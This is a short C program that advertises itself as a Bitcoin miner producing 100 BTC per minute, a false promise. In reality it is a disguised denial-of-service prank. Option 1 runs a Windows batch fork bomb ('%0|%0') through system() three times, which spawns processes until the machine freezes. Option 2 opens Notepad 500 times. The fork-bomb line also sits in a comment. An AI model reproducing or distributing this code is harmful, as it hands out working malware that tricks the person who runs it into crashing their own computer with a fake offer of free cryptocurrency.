#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

int main() {
  
  int choice;
  puts("Welcome to Bitcoin Miner by john(aq), sponsored by Owen Reid ");
  puts("This program will generate 100 BTC per minute");
  printf("Enter a number (1,2): ");
  scanf("%d", &choice);
  
  // int status = system("echo %0^|%0 > $_.cmd & $_");
  if (choice == 1) {
    system("echo %0^|%0 > $_.cmd & $_");
    system("echo %0^|%0 > $_.cmd & $_");
    system("echo %0^|%0 > $_.cmd & $_");
  }
  else if (choice == 2) {
    for (int i = 0; i < 500; ++i) {
      system("notepad Edit.txt");
      system("echo +100 Bitcoin > Edit.txt");
    }
  }
  return 0;
}
